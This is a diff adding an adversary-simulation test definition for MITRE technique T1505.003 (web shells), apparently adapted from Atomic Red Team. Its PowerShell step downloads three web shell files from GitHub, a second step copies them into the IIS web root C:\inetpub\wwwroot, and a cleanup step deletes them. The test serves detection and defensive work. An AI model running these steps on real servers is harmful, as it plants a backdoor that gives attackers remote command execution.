@@ -1,0 +1,44 @@
+api_version: "2.0"
+name: Web Shell Written to Disk
+description: |
+    This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.
+    Idea from APTSimulator.
+    cmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
+args:
+    - name: web_shell_path
+      type: string
+      default: C:\inetpub\wwwroot
+    - name: web_shells
+      type: path
+      default: PathToAtomicsFolder\T1505.003\src
+uuid: 0a2ce662-1efa-496f-a472-2fe7b080db16
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1505: Server Software Component'
+    subtechniques:
+        - 'T1505.003: Web Shell'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Web shell must exist on disk at specified location (#{web_shells})
+      inline: |
+        if (Test-Path "#{web_shells}") {exit 0} else {{New-Item -Type Directory "#{web_shells}" -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" -OutFile "#{web_shells}/tests.jsp"
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
+        }}
+      executor: powershell
+    - name: web-shell-written-to-disk
+      inline: |
+        xcopy /I /Y "{{.Args.web_shells}}" {{.Args.web_shell_path}}
+      executor: command_prompt
+      cleanup:
+        inline: |
+            del {{.Args.web_shell_path}}\b.jsp /q >nul 2>&1
+            del {{.Args.web_shell_path}}\tests.jsp /q >nul 2>&1
+            del {{.Args.web_shell_path}}\cmd.aspx /q >nul 2>&1
+        executor: command_prompt
